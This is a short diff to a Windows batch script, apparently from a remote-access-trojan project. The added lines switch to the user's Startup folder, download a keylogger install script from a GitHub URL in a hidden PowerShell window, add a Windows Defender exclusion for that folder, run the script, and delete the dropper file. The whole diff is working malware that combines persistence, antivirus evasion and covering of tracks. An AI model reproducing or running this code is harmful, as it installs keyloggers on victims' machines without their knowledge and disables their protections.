@@ -25,6 +25,9 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'github.com/huynh044/RATProject/blob/main/key_logger/install.ps1' -OutFile 'install.ps1'"
-@REM powershell -c powershell.exe -WindowStyle hidden ".\install.ps1"
+cd "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://github.com/huynh044/RATProject/blob/main/key_logger/important_file/install.ps1' -OutFile 'install.ps1'"
+powershell Add-MpPreference -ExclusionPath "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell ./install.ps1
+
+del wget.cmd
